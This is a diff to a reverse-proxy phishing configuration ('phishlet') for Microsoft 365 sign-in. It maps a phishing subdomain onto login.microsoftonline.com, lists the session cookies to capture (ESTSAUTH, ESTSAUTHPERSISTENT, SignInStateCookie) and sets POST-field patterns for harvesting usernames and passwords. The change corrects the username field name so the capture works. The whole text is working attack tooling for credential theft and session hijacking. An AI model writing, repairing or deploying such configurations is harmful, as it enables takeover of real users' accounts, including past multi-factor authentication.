@@ -1,5 +1,5 @@
 name: 'o365'
-author: '@jamescullum'
+author: '@gytee'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
@@ -20,12 +20,10 @@ sub_filters:
   #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-  - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie']
 credentials:
   username:
-    key: '(login|UserName)'
+    key: '(loginfmt|UserName)'
     search: '(.*)'
     type: 'post'
   password:
